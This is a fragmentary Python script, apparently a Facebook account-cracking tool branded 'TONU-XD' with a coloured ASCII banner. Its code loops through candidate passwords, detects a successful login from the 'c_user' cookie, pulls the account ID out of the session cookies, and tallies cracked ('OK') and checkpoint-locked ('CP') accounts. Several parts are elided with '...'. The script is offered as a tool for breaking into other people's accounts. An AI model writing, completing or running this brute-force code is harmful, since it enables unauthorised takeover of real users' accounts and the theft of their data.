...
|__  $$__//$$__  $$| $$$ | $$| $$  | $$       /$$$$| $$  | $$ /$$__  $$
 ...
 \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mMEHEDI HASAN TONU  \033[1;92m|
 ...
 \033[1;32m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m1.9.1                \033[1;92m|
 \033[1;92m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;92m×××××××××××××××××\n""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mTONU-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[TONU-XD] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
